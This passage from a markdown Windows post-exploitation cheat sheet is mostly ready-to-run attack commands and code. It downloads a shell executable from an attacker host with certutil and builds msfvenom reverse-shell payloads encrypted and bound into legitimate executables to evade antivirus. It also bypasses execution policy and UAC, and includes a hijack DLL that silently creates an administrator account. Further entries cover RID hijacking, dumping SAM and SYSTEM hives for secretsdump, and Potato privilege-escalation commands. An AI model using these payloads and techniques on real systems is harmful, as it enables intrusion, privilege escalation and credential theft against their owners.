Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Execution policy powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
powershell -ExecutionPolicy Bypass
powershell -ep bypass
```

**powershell transfer data inside windows**
```powershell
cmd.exe /c certutil.exe -f -urlcache -split http://ATTACK_PC/shell.exe c:/windows/temp/shell.exe
**iwr -uri http://IP/PowerUp.ps1 -Outfile PowerUp.ps1**
```

**PowerUp**
```powershell
Get-ModifiableServiceFile
Get-UnquotedService
```
### Evasion

**AV Evasion**

**Check Antivirus Status**
```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
Get-Service WinDefend
Get-MpComputerStatus | select RealTimeProtectionEnabled
Get-NetFirewallProfile | Format-Table Name, Enabled
```

**Msfvenom Reverse shell encrypted**
```bash
# Basic encoding
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe --encrypt xor --encrypt-key "<KEY>" -o shell.exe

# Bad characters
msfvenom -p windows/shell_reverse_tcp -b "\x00\x0a\x0d" LHOST=<ATTACKER_IP> LPORT=<PORT> -e x86/alpha_mixed -f exe -o shell.exe

# Binder
msfvenom -x <LEGIT_EXE> -k -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o <OUTPUT_EXE>
```
**Powershell evasion**
```powershell
# Downgrade PowerShell
powershell -version 2

# Bypass AMSI
# https://github.com/RythmStick/AMSITrigger

# Unicorn
# https://github.com/trustedsec/unicorn
```
**Runtime Evasion**

- Use [UACme](https://github.com/hfiref0x/UACME) for UAC bypass
- Fodhelper bypass
- Manifest autoElevate check with sigcheck
---
**UAC disable**
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 /f
```
---
### Privilege Escalation Windows
**Common SID Values**

| SID         | Description         |
| ----------- | ------------------- |
| S-1-0-0     | Nobody              |
| S-1-1-0     | Everybody           |
| S-1-5-11    | Authenticated Users |
| S-1-5-18    | Local System        |
| S-1-5-*-500 | Administrator       |

**Binary/DLL Hijacking**

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch(ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user <USERNAME> <PASSWORD> /add");
            system("net localgroup administrators <USERNAME> /add");
            break;
    }
    return TRUE;
}
```
```bash
# Compile DLL
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
**CVE best / Precompiled binary**
- [ Precompiled Binaries & AD Toolset](https://github.com/jakobfriedl/precompiled-binaries)
- [GhostPack Compiled Binary](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- CVE-2023-29360
- KB5027215

**RID Hijacking**
 In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.
```powershell
PsExec64.exe -i -s regedit
HKLM\SAM\SAM\Domains\Account\Users
```
<img src="media/rid-hijacking.png"
style="" />
We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401)

**SeBackup / SeRestore Privilege**
```powershell
reg save hklm\system C:\Users\<USER>\system.hive
reg save hklm\sam C:\Users\<USER>\sam.hive
```
```bash
python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
```powershell
secedit /export /cfg config.inf
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
**SeImpersonatePrivilege Exploitation**

- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
- [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [SweetPotato](https://github.com/uknowsec/SweetPotato)
```powershell
# PrintSpoofer
PrintSpoofer.exe -i -c cmd

# JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c <COMMAND>" -t *
```
**Unquoted Service Paths**
```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows\" | findstr /i /v "\""
```
**UAC disable**
```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 /f
```

**run as different user**
```powershell
runas /savecred /user:admin cmd.exe
```
